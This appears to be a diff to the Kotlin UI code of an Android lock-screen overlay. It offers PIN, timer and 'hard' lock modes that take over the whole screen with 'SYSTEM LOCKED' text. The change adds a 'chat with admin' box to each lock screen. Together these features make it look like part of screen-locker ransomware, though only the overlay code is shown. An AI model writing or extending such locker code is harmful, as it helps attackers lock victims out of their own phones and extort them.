@@ -14,15 +14,13 @@ import android.util.TypedValue
 import android.view.Gravity
 import android.view.View
 import android.view.WindowManager
+import android.widget.EditText
 import android.widget.FrameLayout
 import android.widget.LinearLayout
 import android.widget.TextView
 
 object LockOverlayView {
 
-    // ============================================================
-    // WINDOW PARAMS
-    // ============================================================
     fun paramsFull(): WindowManager.LayoutParams {
         val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
@@ -72,9 +70,82 @@ object LockOverlayView {
     }
 
     // ============================================================
-    // LOCK PIN — KEYPAD CUSTOM 1-9, 0, HAPUS, OK
+    // CHAT SECTION
     // ============================================================
-    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit): View {
+    private fun makeChatSection(ctx: Context, onChat: ((String) -> Unit)?): View? {
+        if (onChat == null) return null
+
+        val container = LinearLayout(ctx).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(ctx, 4), dp(ctx, 12), dp(ctx, 4), dp(ctx, 4))
+        }
+
+        val label = TextView(ctx).apply {
+            text = "CHAT DENGAN ADMIN"
+            setTextColor(Color.parseColor("#D4AF37"))
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
+            setTypeface(null, Typeface.BOLD)
+            gravity = Gravity.CENTER
+            letterSpacing = 0.2f
+            setPadding(0, 0, 0, dp(ctx, 6))
+        }
+
+        val inputRow = LinearLayout(ctx).apply {
+            orientation = LinearLayout.HORIZONTAL
+            gravity = Gravity.CENTER_VERTICAL
+        }
+
+        val input = EditText(ctx).apply {
+            hint = "Tulis pesan..."
+            setHintTextColor(Color.parseColor("#666666"))
+            setTextColor(Color.WHITE)
+            textSize = 12f
+            background = GradientDrawable().apply {
+                shape = GradientDrawable.RECTANGLE
+                cornerRadius = 20f
+                setColor(Color.parseColor("#CC1A1A1A"))
+                setStroke(1, Color.parseColor("#00FF66"))
+            }
+            setPadding(dp(ctx, 14), dp(ctx, 10), dp(ctx, 14), dp(ctx, 10))
+            maxLines = 2
+            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
+        }
+
+        val sendBtn = TextView(ctx).apply {
+            text = "\u27A4"
+            setTextColor(Color.WHITE)
+            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
+            gravity = Gravity.CENTER
+            background = GradientDrawable().apply {
+                shape = GradientDrawable.RECTANGLE
+                cornerRadius = 50f
+                setColor(Color.parseColor("#B30000"))
+            }
+            setPadding(dp(ctx, 12), dp(ctx, 8), dp(ctx, 12), dp(ctx, 8))
+            val lp = LinearLayout.LayoutParams(dp(ctx, 44), dp(ctx, 44))
+            lp.setMargins(dp(ctx, 8), 0, 0, 0)
+            layoutParams = lp
+            setOnClickListener {
+                val txt = input.text.toString().trim()
+                if (txt.isNotEmpty()) {
+                    onChat(txt)
+                    input.setText("")
+                }
+            }
+        }
+
+        inputRow.addView(input)
+        inputRow.addView(sendBtn)
+
+        container.addView(label)
+        container.addView(inputRow)
+        return container
+    }
+
+    // ============================================================
+    // LOCK PIN
+    // ============================================================
+    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
         val root = FrameLayout(ctx).apply {
             setBackgroundColor(Color.parseColor("#0A0A0A"))
         }
@@ -147,7 +218,6 @@ object LockOverlayView {
             setPadding(0, dp(ctx, 4), 0, dp(ctx, 14))
         }
 
-        // ============ PIN DISPLAY 4 KOTAK ============
         val pinDisplay = LinearLayout(ctx).apply {
             orientation = LinearLayout.HORIZONTAL
             gravity = Gravity.CENTER
@@ -182,7 +252,6 @@ object LockOverlayView {
             setPadding(0, dp(ctx, 10), 0, dp(ctx, 8))
         }
 
-        // ============ PIN BUFFER ============
         val pinBuffer = StringBuilder()
 
         fun refreshBoxes() {
@@ -212,20 +281,19 @@ object LockOverlayView {
             }
         }
 
-        // ============ KEYPAD CUSTOM ============
         val keypad = LinearLayout(ctx).apply {
             orientation = LinearLayout.VERTICAL
             gravity = Gravity.CENTER
         }
 
-        val btnSize = dp(ctx, 54)
-        val btnMargin = dp(ctx, 5)
+        val btnSize = dp(ctx, 50)
+        val btnMargin = dp(ctx, 4)
 
         fun makeKey(label: String, isDanger: Boolean, onClick: () -> Unit): TextView {
             return TextView(ctx).apply {
                 text = label
                 setTextColor(if (isDanger) Color.parseColor("#FF4444") else Color.parseColor("#00FF66"))
-                setTextSize(TypedValue.COMPLEX_UNIT_SP, 20f)
+                setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
                 setTypeface(null, Typeface.BOLD)
                 gravity = Gravity.CENTER
                 background = GradientDrawable().apply {
@@ -290,7 +358,6 @@ object LockOverlayView {
         addRow(listOf("7", "8", "9"))
         addRow(listOf("DEL", "0", "OK"))
 
-        // ============ FLOATING TEXT ============
         val floating = TextView(ctx).apply {
             text = "SYSTEM LOCKED"
             setTextColor(Color.parseColor("#00FF66"))
@@ -306,7 +373,6 @@ object LockOverlayView {
             start()
         }
 
-        // ============ ADD TO CARD ============
         card.addView(icon)
         card.addView(logo)
         card.addView(logoSub)
@@ -316,6 +382,10 @@ object LockOverlayView {
         card.addView(pinDisplay)
         card.addView(status)
         card.addView(keypad)
+
+        val chatView = makeChatSection(ctx, onChat)
+        if (chatView != null) card.addView(chatView)
+
         card.addView(floating)
 
         val cardParams = FrameLayout.LayoutParams(
@@ -339,7 +409,7 @@ object LockOverlayView {
     // ============================================================
     // LOCK HARD
     // ============================================================
-    fun buildHard(ctx: Context): View {
+    fun buildHard(ctx: Context, onChat: ((String) -> Unit)? = null): View {
         val root = FrameLayout(ctx).apply {
             setBackgroundColor(Color.parseColor("#0A0A0A"))
         }
@@ -421,6 +491,10 @@ object LockOverlayView {
         container.addView(title)
         container.addView(logo)
         container.addView(msg)
+
+        val chatView = makeChatSection(ctx, onChat)
+        if (chatView != null) container.addView(chatView)
+
         container.addView(warning)
 
         val lp = FrameLayout.LayoutParams(
@@ -444,7 +518,7 @@ object LockOverlayView {
     // ============================================================
     // LOCK TIMER
     // ============================================================
-    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit): View {
+    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
         val root = FrameLayout(ctx).apply {
             setBackgroundColor(Color.parseColor("#0A0A0A"))
         }
@@ -517,6 +591,9 @@ object LockOverlayView {
         container.addView(message)
         container.addView(timerText)
         container.addView(subTimer)
+
+        val chatView = makeChatSection(ctx, onChat)
+        if (chatView != null) container.addView(chatView)
 
         val lp = FrameLayout.LayoutParams(
             FrameLayout.LayoutParams.MATCH_PARENT,
